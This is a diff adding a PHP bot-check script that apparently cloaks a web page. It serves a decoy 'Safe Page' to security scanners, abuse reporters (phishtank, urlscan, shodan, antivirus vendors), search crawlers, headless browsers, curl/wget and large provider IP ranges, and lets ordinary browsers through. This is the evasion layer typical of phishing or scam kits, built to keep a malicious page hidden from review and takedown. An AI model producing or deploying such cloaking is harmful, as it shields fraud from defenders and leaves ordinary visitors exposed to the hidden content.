@@ -1,0 +1,69 @@
+<?php
+function checkBot() {
+    // Manual Testing: Simulate a bot with ?useragent=googlebot
+    if (isset($_GET['useragent']) && $_GET['useragent'] == "googlebot") {
+        $_SERVER['HTTP_USER_AGENT'] = "Googlebot/2.1 (+http://www.google.com/bot.html)";
+    }
+
+    // ALLOW REAL WEB BROWSERS (NO BLOCKING OF REAL USERS)
+    $allowedBrowsers = ['chrome', 'firefox', 'safari', 'opera', 'edge', 'trident'];
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+
+    foreach ($allowedBrowsers as $browser) {
+        if (strpos($userAgent, $browser) !== false) {
+            return false; // Allowed: Not a bot
+        }
+    }
+
+    // BLOCK SPECIFIC USER AGENTS: if user agent contains "httrack", "wget", or "curl"
+    $blockedAgents = ['httrack', 'wget', 'curl'];
+    foreach ($blockedAgents as $agent) {
+        if (strpos($userAgent, $agent) !== false) {
+            return true; // Blocked
+        }
+    }
+
+    // BLOCK ALL BOT NAMES: any user agent containing "bot" will be blocked
+    if (strpos($userAgent, 'bot') !== false) {
+        return true; // Blocked
+    }
+
+    // BLOCK BAD BOTS & SECURITY SCANNERS (additional keywords)
+    $botKeywords = [
+        'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'yahoo! slurp', 'duckduckbot', 'sogou spider', 'exabot',
+        'facebot', 'applebot', 'twitterbot', 'linkedinbot', 'pinterestbot', 'ahrefsbot', 'semrushbot', 'mj12bot',
+        'seznambot', 'dotbot', 'gigabot', 'rogerbot', 'archive.org_bot', 'ia_archiver', 'webcrawler', 'screaming frog',
+        'urlchecker', 'feedfetcher', 'mediapartners-google', 'bingpreview', 'nimbostratus', 'dataprovider', 'crawling',
+        'scanner', 'phishtank', 'securitytrails', 'shodan', 'urlscan', 'trendmicro', 'malwarebytes', 'fortinet',
+        'mcafee', 'avast', 'drweb', 'spider', 'crawler', 'headless', 'selenium', 'phantomjs'
+    ];
+    foreach ($botKeywords as $bot) {
+        if (strpos($userAgent, $bot) !== false) {
+            return true; // Blocked
+        }
+    }
+
+    // BLOCK BAD IP RANGES
+    $badIPs = [
+        '66.249.', '74.125.', '173.194.', '209.85.', '216.239.', '64.233.', '216.58.', '34.117.', '35.191.', '23.251.',
+        '142.250.', '146.112.', '192.178.', '185.175.', '195.189.', '204.79.197.', '157.240.', '31.13.', '66.102.', '66.220.',
+        '72.21.', '91.198.', '103.10.', '104.16.', '104.17.', '104.18.', '104.19.', '108.162.', '138.197.', '141.101.',
+        '157.55.', '157.56.', '172.217.', '173.255.', '185.60.', '185.64.', '193.10.', '193.104.', '207.46.', '185.93.228.',
+        '185.93.229.', '185.93.230.', '185.93.231.', '104.244.42.', '192.0.2.', '185.199.', '198.51.100.', '203.0.113.',
+        '34.90.', '35.203.', '35.221.', '130.211.', '216.58.', '209.85.', '64.233.', '8.8.8.', '8.34.34.', '162.222.',
+        '192.178.', '34.102.', '199.36.', '23.251.', '45.40.', '35.186.', '54.156.', '52.15.', '204.79.', '35.191.'
+    ];
+    $remoteIP = $_SERVER['REMOTE_ADDR'];
+    foreach ($badIPs as $ip) {
+        if (strpos($remoteIP, $ip) === 0) {
+            return true; // Blocked
+        }
+    }
+    return false; // Allowed
+}
+
+if (checkBot()) {
+    header("HTTP/1.1 200 OK");
+    die("<h1>Safe Page</h1>");
+}
+?>
